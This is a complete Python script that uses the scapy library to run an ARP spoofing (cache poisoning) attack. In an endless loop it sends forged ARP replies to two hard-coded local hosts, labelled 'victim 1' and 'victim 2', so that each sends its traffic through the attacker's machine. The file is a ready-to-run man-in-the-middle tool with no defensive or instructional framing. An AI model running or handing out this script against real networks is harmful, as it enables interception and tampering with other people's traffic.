import scapy.all as scp
import socket
import time

# Source - https://stackoverflow.com/a/28950776 (user: fatal_error)
def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        s.connect(('10.254.254.254', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

iface = "en0"
rate = 100

src_mac_addr = scp.get_if_hwaddr(iface) # source MAC
src_ip_addr = get_ip() # source IP

target1_ip = "192.168.11.71" # victim 1 IP
target1_mac = "bc:f7:30:d7:33:82" # victim 1 MAC

target2_ip = "192.168.11.254" # victim 2 IP
target2_mac = "cc:ed:21:71:38:90" # victim 2 MAC

def flood_victim(src_ip, src_mac, dst_ip, dst_mac):
    pkt = scp.Ether(
        src=src_mac,
        dst=dst_mac
    ) / scp.ARP(
        op=2,
        psrc=src_ip,
        pdst=dst_ip,
        hwsrc=src_mac
    )
    scp.sendp(pkt, iface=iface, verbose=True)

while True:
	# tell target 1 that I am target 2
    flood_victim(target2_ip, src_mac_addr, target1_ip, target1_mac)

	# tell target 2 that I am target 1
    flood_victim(target1_ip, src_mac_addr, target2_ip, target2_mac)
    time.sleep(2)